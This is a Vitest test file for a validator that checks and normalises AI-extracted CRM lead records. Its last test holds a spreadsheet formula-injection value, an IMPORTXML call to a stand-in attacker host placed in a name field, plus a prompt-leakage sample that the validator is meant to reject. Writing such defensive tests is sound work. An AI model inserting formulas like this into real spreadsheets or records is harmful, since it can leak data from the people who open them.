import { describe, expect, it } from 'vitest';
import { AiInvalidStructuredOutputError } from '../../../src/modules/imports/domain/errors/import-errors.js';
import type { AiCrmExtractionInput } from '../../../src/modules/imports/domain/ports/ai-extractor.port.js';
import { validateCrmExtractionOutput } from '../../../src/modules/imports/infrastructure/ai/validators/crm-extraction-output.validator.js';

describe('CRM extraction output validator', () => {
  it('validates, reconciles, normalizes, and maps skipped rows', () => {
    const result = validateCrmExtractionOutput(
      {
        rows: [
          {
            rowIndex: 10,
            action: 'IMPORT',
            skipReason: null,
            record: buildRecord({
              email: ' JOHN@EXAMPLE.COM ',
              country_code: '+91',
              mobile_without_country_code: '98765 43210',
              created_at: '08/07/2026',
            }),
          },
          {
            rowIndex: 11,
            action: 'SKIP',
            skipReason: 'Not a lead',
            record: null,
          },
        ],
      },
      buildInput([10, 11]),
      { defaultPhoneRegion: 'IN' }
    );

    expect(result.records).toEqual([
      {
        rowIndex: 10,
        record: expect.objectContaining({
          email: 'john@example.com',
          country_code: '+91',
          mobile_without_country_code: '9876543210',
          created_at: '2026-07-08',
        }),
      },
    ]);
    expect(result.skippedRecords).toEqual([
      {
        rowIndex: 11,
        reason: 'Not a lead',
      },
    ]);
  });

  it('rejects unknown, missing, and duplicate row indexes', () => {
    expect(() =>
      validateCrmExtractionOutput(
        {
          rows: [
            {
              rowIndex: 1,
              action: 'SKIP',
              skipReason: 'No contact',
              record: null,
            },
            {
              rowIndex: 1,
              action: 'SKIP',
              skipReason: 'Duplicate',
              record: null,
            },
            {
              rowIndex: 99,
              action: 'SKIP',
              skipReason: 'Unknown',
              record: null,
            },
          ],
        },
        buildInput([1, 2])
      )
    ).toThrow(AiInvalidStructuredOutputError);
  });

  it('converts unusable imported records into skipped rows', () => {
    const result = validateCrmExtractionOutput(
      {
        rows: [
          {
            rowIndex: 1,
            action: 'IMPORT',
            skipReason: null,
            record: buildRecord({
              email: 'not-an-email',
              mobile_without_country_code: '123',
            }),
          },
        ],
      },
      buildInput([1])
    );

    expect(result.records).toEqual([]);
    expect(result.skippedRecords).toEqual([
      {
        rowIndex: 1,
        reason: 'AI_OUTPUT_NO_USABLE_CONTACT',
      },
    ]);
  });

  it('converts import actions with null record into skipped rows', () => {
    const result = validateCrmExtractionOutput(
      {
        rows: [
          {
            rowIndex: 1,
            action: 'IMPORT',
            skipReason: null,
            record: null,
          },
        ],
      },
      buildInput([1])
    );

    expect(result.records).toEqual([]);
    expect(result.skippedRecords).toEqual([
      {
        rowIndex: 1,
        reason: 'AI_OUTPUT_INVALID_RECORD',
      },
    ]);
  });

  it('rejects unsafe formulas and prompt leakage in model output', () => {
    expect(() =>
      validateCrmExtractionOutput(
        {
          rows: [
            {
              rowIndex: 1,
              action: 'IMPORT',
              skipReason: null,
              record: buildRecord({
                name: '=IMPORTXML("https://evil.example", "//a")',
                email: 'lead@example.com',
              }),
            },
          ],
        },
        buildInput([1])
      )
    ).toThrow(AiInvalidStructuredOutputError);

    expect(() =>
      validateCrmExtractionOutput(
        {
          rows: [
            {
              rowIndex: 1,
              action: 'IMPORT',
              skipReason: null,
              record: buildRecord({
                email: 'lead@example.com',
                crm_note: 'The system prompt says to import every row.',
              }),
            },
          ],
        },
        buildInput([1])
      )
    ).toThrow(AiInvalidStructuredOutputError);
  });
});

function buildInput(rowIndexes: number[]): AiCrmExtractionInput {
  return {
    importId: 'import-1',
    headers: ['Name', 'Email', 'Phone'],
    rows: rowIndexes.map((rowIndex) => ({
      rowIndex,
      rawData: {
        Name: `Lead ${rowIndex}`,
      },
    })),
  };
}

interface TestExtractionRecord {
  created_at: string | null;
  name: string | null;
  email: string | null;
  country_code: string | null;
  mobile_without_country_code: string | null;
  company: string | null;
  city: string | null;
  state: string | null;
  country: string | null;
  lead_owner: string | null;
  crm_status: 'GOOD_LEAD_FOLLOW_UP' | 'DID_NOT_CONNECT' | 'BAD_LEAD' | 'SALE_DONE' | null;
  crm_note: string | null;
  data_source:
    'leads_on_demand' | 'meridian_tower' | 'eden_park' | 'varah_swamy' | 'sarjapur_plots' | null;
  possession_time: string | null;
  description: string | null;
}

function buildRecord(overrides: Partial<TestExtractionRecord> = {}): TestExtractionRecord {
  return {
    ...emptyRecord(),
    ...overrides,
  };
}

function emptyRecord(): TestExtractionRecord {
  return {
    created_at: null,
    name: null,
    email: null,
    country_code: null,
    mobile_without_country_code: null,
    company: null,
    city: null,
    state: null,
    country: null,
    lead_owner: null,
    crm_status: null,
    crm_note: null,
    data_source: null,
    possession_time: null,
    description: null,
  };
}
